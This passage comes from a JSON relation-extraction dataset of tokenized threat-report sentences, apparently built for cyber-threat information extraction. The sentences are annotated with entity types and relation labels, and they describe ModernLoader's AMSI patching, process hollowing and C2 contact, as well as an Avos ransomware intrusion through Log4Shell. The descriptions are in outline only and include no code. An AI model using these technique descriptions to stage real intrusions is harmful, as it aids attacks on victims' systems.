"index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [191, 191], "name": "C2 URL", "pos": [8, 10], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "CO", "evidence": [1], "t": 2, "h": 3}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 2, "t": 9}, {"r": "RD", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "t": 8, "h": 10}, {"r": "IJ", "evidence": [4], "h": 10, "t": 11}, {"r": "FR", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 13}, {"r": "FR", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "ST", "evidence": [5, 6, 7], "h": 12, "t": 16}, {"r": "RF", "evidence": [5, 6, 7], "h": 12, "t": 16}, {"r": "ST", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "RF", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}]}, {"title": "05_g02-10", "sents": [["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injected", "payload", "is", "Client.exe", ",", "a", "ModernLoader", "instance", "."], ["The", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["After", "initializing", ",", "ModernLoader", "collects", "system", "information", ",", "such", "as", "Win32_ComputerSystemProduct", "UUID", ",", "external", "IP", "address", ",", "IP", "address", "country", ",", "and", "user", "privileges", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "payload", "pos": [13, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "payload", "pos": [20, 21], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [32, 32], "name": "RegSvcs.exe", "pos": [32, 33], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "Killamsi.dll", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "DLL", "pos": [1, 2], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [71, 71], "name": "amsi.dll", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "friday.dll", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [96, 96], "name": "It", "pos": [12, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [100, 100], "name": "process", "pos": [16, 17], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [111, 111], "name": "RegSvcs.exe", "pos": [27, 28], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [123, 123], "name": "It", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "svchost.exe", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [152, 152], "name": "Client.exe", "pos": [4, 5], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [155, 155], "name": "ModernLoader", "pos": [7, 8], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "C2 URL", "pos": [8, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "ModernLoader", "pos": [3, 4], "index": "15_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [175, 175], "name": "information", "pos": [6, 7], "index": "16_0"}]], "labels": [{"r": "CO", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "t": 6, "h": 8}, {"r": "IJ", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "FR", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "ST", "evidence": [4, 5, 6], "h": 10, "t": 14}, {"r": "RF", "evidence": [4, 5, 6], "h": 10, "t": 14}, {"r": "ST", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "RF", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "CO", "evidence": [5], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6, 7], "h": 12, "t": 15}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}]}, {"title": "05_g02-11", "sents": [["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injected", "payload", "is", "Client.exe", ",", "a", "ModernLoader", "instance", "."], ["The", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["After", "initializing", ",", "ModernLoader", "collects", "system", "information", ",", "such", "as", "Win32_ComputerSystemProduct", "UUID", ",", "external", "IP", "address", ",", "IP", "address", "country", ",", "and", "user", "privileges", "."], ["ModernLoader", "periodically", "contacts", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Killamsi.dll", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "DLL", "pos": [1, 2], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [37, 37], "name": "amsi.dll", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "friday.dll", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "It", "pos": [12, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "process", "pos": [16, 17], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [77, 77], "name": "RegSvcs.exe", "pos": [27, 28], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "It", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "svchost.exe", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "Client.exe", "pos": [4, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "ModernLoader", "pos": [7, 8], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [132, 132], "name": "C2 URL", "pos": [8, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [138, 138], "name": "ModernLoader", "pos": [3, 4], "index": "12_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [141, 141], "name": "information", "pos": [6, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [160, 160], "name": "ModernLoader", "pos": [0, 1], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [164, 164], "name": "C2 server", "pos": [4, 6], "index": "15_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "t": 3, "h": 5}, {"r": "IJ", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 8}, {"r": "FR", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "ST", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "RF", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 9, "t": 14}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [7], "h": 14, "t": 15}]}, {"title": "05_g02-12", "sents": [["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injected", "payload", "is", "Client.exe", ",", "a", "ModernLoader", "instance", "."], ["The", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["After", "initializing", ",", "ModernLoader", "collects", "system", "information", ",", "such", "as", "Win32_ComputerSystemProduct", "UUID", ",", "external", "IP", "address", ",", "IP", "address", "country", ",", "and", "user", "privileges", "."], ["ModernLoader", "periodically", "contacts", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", "."], ["Its", "main", "purpose", "is", "to", "download", "and", "execute", "additional", "payloads", "and", "modules", ",", "as", "instructed", "by", "the", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "DLL", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [14, 14], "name": "amsi.dll", "pos": [14, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "friday.dll", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "It", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "process", "pos": [16, 17], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [54, 54], "name": "RegSvcs.exe", "pos": [27, 28], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "It", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [71, 71], "name": "svchost.exe", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "Client.exe", "pos": [4, 5], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "ModernLoader", "pos": [7, 8], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [109, 109], "name": "C2 URL", "pos": [8, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [115, 115], "name": "ModernLoader", "pos": [3, 4], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [118, 118], "name": "information", "pos": [6, 7], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "ModernLoader", "pos": [0, 1], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [141, 141], "name": "C2 server", "pos": [4, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [161, 161], "name": "payloads", "pos": [9, 10], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [169, 169], "name": "C2 server", "pos": [17, 19], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "t": 2, "h": 4}, {"r": "IJ", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "FR", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "ST", "evidence": [2, 3, 4], "h": 6, "t": 10}, {"r": "RF", "evidence": [2, 3, 4], "h": 6, "t": 10}, {"r": "ST", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "RF", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 8, "t": 13}, {"r": "WR", "evidence": [5], "h": 11, "t": 12}, {"r": "ST", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 15}]}, {"title": "07_g02-0", "sents": [["Usually", ",", "Avos", "employs", "spam", "campaigns", "to", "spread", "ransomware", "through", "emails", "as", "the", "initial", "infection", "vector", "."], ["However", ",", "in", "the", "case", "at", "hand", ",", "an", "ESXi", "server", "with", "a", "Log4Shell", "vulnerability", "exposed", "on", "the", "internet", "over", "VMware", "Horizon", "Unified", "Access", "Gateways", "(", "UAG", ")", "was", "used", "as", "a", "point", "of", "entry", "."], ["Several", "Log4j", "vulnerabilities", "were", "present", "on", "the", "customer", "'s", "UAG", ".", "Additionally", ",", "the", "inner-transit", "firewalls", "that", "could", "limit", "access", "to", "the", "internal", "infrastructure", "were", "not", "configured", ",", "making", "it", "easy", "for", "attackers", "to", "establish", "a", "foothold", "and", "access", "their", "internal", "servers", "."], ["The", "threat", "actors", "tried", "multiple", "ways", "to", "gain", "a", "foothold", "on", "the", "victim", "network", "during", "the", "attack", "\u2019", "s", "initial", "stages", "."], ["Talos", "observed", "various", "malicious", "tools", "and", "living-off-the-land", "binaries", "(", "LoLBins", ")", "were", "deployed", "on", "endpoints", "."], ["In", "addition", ",", "the", "WMI", "Provider", "Host", "(", "wmiprvse.exe", ")", "on", "a", "Windows", "Server", "was", "used", "as", "the", "initial", "point", "of", "entry", ",", "and", "an", "encoded", "PowerShell", "script", "was", "executed", "using", "the", "DownloadString", "method", "on", "Feb.", "11", "."], ["On", "Feb.", "14", ",", "a", "retrospective", "detection", "was", "triggered", "for", "the", "RuntimeBrokerService.exe", "executable", "in", "``", "C", ":", "\\Windows\\System32\\temp", "''", "for", "creating", "a", "file", "named", "``", "watcher.exe", ".", "''"], ["Another", "encoded", "PowerShell", "command", "was", "executed", "on", "March", "4", ",", "and", "two", "days", "later", ",", "the", "attacker", "ran", "more", "PowerShell", "scripts", "to", "download", "and", "execute", "a", "Sliver", "payload", "labeled", "``", "vmware_kb.exe", ".", "''"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "Avos", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "ransomware", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "ESXi server", "pos": [9, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "Log4Shell", "pos": [13, 14], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "Gateways", "pos": [24, 25], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "Log4j", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [85, 85], "name": "attackers", "pos": [32, 33], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "actors", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "malicious tools", "pos": [3, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "LoLBins", "pos": [9, 10], "index": "9_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [142, 142], "name": "wmiprvse.exe", "pos": [8, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [160, 160], "name": "PowerShell", "pos": [26, 27], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [183, 183], "name": "RuntimeBrokerService.exe", "pos": [11, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [197, 197], "name": "watcher.exe", "pos": [25, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [202, 202], "name": "PowerShell", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [216, 216], "name": "attacker", "pos": [16, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [219, 219], "name": "PowerShell scripts", "pos": [19, 21], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [230, 230], "name": "vmware_kb.exe", "pos": [30, 31], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 6}, {"r": "ST", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "RF", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 6, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 6, "t": 15}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "EX", "evidence": [3, 4, 5], "h": 7, "t": 10}, {"r": "FR", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 11}, {"r": "WR", "evidence": [4, 5], "t": 9, "h": 11}, {"r": "RD", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "FR", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "RD", "evidence": [6, 7], "t": 12, "h": 14}, {"r": "RD", "evidence": [6, 7], "t": 12, "h": 14}, {"r": "WR", "evidence": [6, 7], "t": 12, "h": 14}, {"r": "EX", "evidence": [7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 15, "t": 17}]}, {"title": "07_g02-1", "sents": [["However", ",", "in", "the", "case", "at", "hand", ",", "an", "ESXi", "server", "with", "a", "Log4Shell", "vulnerability", "exposed", "on", "the", "internet", "over", "VMware", "Horizon", "Unified", "Access", "Gateways", "(", "UAG", ")", "was", "used", "as", "a", "point", "of", "entry", "."], ["Several", "Log4j", "vulnerabilities", "were", "present", "on", "the", "customer", "'s", "UAG", ".", "Additionally", ",", "the", "inner-transit", "firewalls", "that", "could", "limit", "access", "to", "the", "internal", "infrastructure", "were", "not", "configured", ",", "making", "it", "easy", "for", "attackers", "to", "establish", "a", "foothold", "and", "access", "their", "internal", "servers", "."], ["The", "threat", "actors", "tried", "multiple", "ways", "to", "gain", "a", "foothold", "on", "the", "victim", "network", "during", "the", "attack", "\u2019", "s", "initial", "stages", "."], ["Talos", "observed", "various", "malicious", "tools", "and", "living-off-the-land", "binaries", "(", "LoLBins", ")", "were", "deployed", "on", "endpoints", "."], ["In", "addition", ",", "the", "WMI", "Provider", "Host", "(", "wmiprvse.exe", ")", "on", "a", "Windows", "Server", "was", "used", "as", "the", "initial", "point", "of", "entry", ",", "and", "an", "encoded", "PowerShell", "script", "was", "executed", "using", "the", "DownloadString", "method", "on", "Feb.", "11", "."], ["On", "Feb.", "14", ",", "a", "retrospective", "detection", "was", "triggered", "for", "the", "RuntimeBrokerService.exe", "executable", "in", "``", "C", ":", "\\Windows\\System32\\temp", "''", "for", "creating", "a", "file", "named", "``", "watcher.exe", ".", "''"], ["Another", "encoded", "PowerShell", "command", "was", "executed", "on", "March", "4", ",", "and", "two", "days", "later", ",", "the", "attacker", "ran", "more", "PowerShell", "scripts", "to", "download", "and", "execute", "a", "Sliver", "payload", "labeled", "``", "vmware_kb.exe", ".", "''"], ["Various", "PowerShell", "scripts", "were", "downloaded", "in", "the", "following", "days", "to", "obtain", "additional", "files", ",", "including", "Mimikatz", "and", "a", ".zip", "archive", "called", "``", "IIS", "Temporary", "Compressed", "Files.zip", "''", "containing", "Cobalt", "Strike", "beacons", "and", "a", "port", "scanner", "labeled", "``", "scanner.exe", ".", "''"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "ESXi server", "pos": [9, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "Log4Shell", "pos": [13, 14], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "Gateways", "pos": [24, 25], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "Log4j", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [68, 68], "name": "attackers", "pos": [32, 33], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "actors", "pos": [2, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "malicious tools", "pos": [3, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [110, 110], "name": "LoLBins", "pos": [9, 10], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [125, 125], "name": "wmiprvse.exe", "pos": [8, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [143, 143], "name": "PowerShell", "pos": [26, 27], "index": "9_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [166, 166], "name": "RuntimeBrokerService.exe", "pos": [11, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [180, 180], "name": "watcher.exe", "pos": [25, 26], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [185, 185], "name": "PowerShell", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [199, 199], "name": "attacker", "pos": [16, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [202, 202], "name": "PowerShell scripts", "pos": [19, 21], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [213, 213], "name": "vmware_kb.exe", "pos": [30, 31], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [217, 217], "name": "PowerShell scripts", "pos": [1, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [231, 231], "name": "Mimikatz", "pos": [15, 16], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [238, 238], "name": "IIS Temporary Compressed Files.zip", "pos": [22, 26], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [253, 253], "name": "scanner.exe", "pos": [37, 38], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "ST", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 4, "t": 13}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "EX", "evidence": [2, 3, 4], "h": 5, "t": 8}, {"r": "FR", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 9}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 9}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "FR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "RD", "evidence": [5, 6], "t": 10, "h": 12}, {"r": "RD", "evidence": [5, 6], "t": 10, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 10, "h": 12}, {"r": "EX", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6], "h": 13, "t": 15}, {"r": "EX", "evidence": [6, 7], "h": 13, "t": 16}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 17}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 18}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 19}]}, {"title": "07_g02-2", "sents": [["Several", "Log4j", "vulnerabilities", "were", "present", "on", "the", "customer", "'s", "UAG", ".", "Additionally", ",", "the", "inner-transit", "firewalls", "that", "could", "limit", "access", "to", "the", "internal", "infrastructure", "were", "not", "configured", ",", "making", "it", "easy", "for", "attackers", "to", "establish", "a", "foothold", "and", "access", "their", "internal", "servers", "."], ["The", "threat", "actors", "tried", "multiple", "ways", "to", "gain", "a", "foothold", "on", "the", "victim", "network", "during", "the", "attack", "\u2019", "s", "initial", "stages", "."], ["Talos", "observed", "various", "malicious", "tools", "and", "living-off-the-land", "binaries", "(", "LoLBins", ")", "were", "deployed", "on", "endpoints", "."], ["In", "addition", ",", "the", "WMI", "Provider", "Host", "(", "wmiprvse.exe", ")", "on", "a", "Windows", "Server", "was", "used", "as", "the", "initial", "point", "of", "entry", ",", "and", "an", "encoded", "PowerShell", "script", "was", "executed", "using", "the", "DownloadString", "method", "on", "Feb.", "11", "."], ["On", "Feb.", "14", ",", "a", "retrospective", "detection", "was", "triggered", "for", "the", "RuntimeBrokerService.exe", "executable", "in", "``", "C", ":", "\\Windows\\System32\\temp", "''", "for", "creating", "a", "file", "named", "``", "watcher.exe", ".", "''"], ["Another", "encoded", "PowerShell", "command", "was", "executed", "on", "March", "4", ",", "and", "two", "days", "later", ",", "the", "attacker", "ran", "more", "PowerShell", "scripts", "to", "download", "and", "execute", "a", "Sliver", "payload", "labeled", "``", "vmware_kb.exe", ".", "''"], ["Various", "PowerShell", "scripts", "were", "downloaded", "in", "the", "following", "days", "to", "obtain", "additional", "files", ",", "including", "Mimikatz", "and", "a", ".zip", "archive", "called", "``", "IIS", "Temporary", "Compressed", "Files.zip", "''", "containing", "Cobalt", "Strike", "beacons", "and", "a", "port", "scanner", "labeled", "``", "scanner.exe", ".", "''"], ["The", "attackers", "also", "modified", "administrative", "settings", "using", "WMIC", "on", "both", "local", "and", "remote", "hosts", "to", "move", "laterally", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "Log4j", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [32, 32], "name": "attackers", "pos": [32, 33], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "actors", "pos": [2, 3], "index": 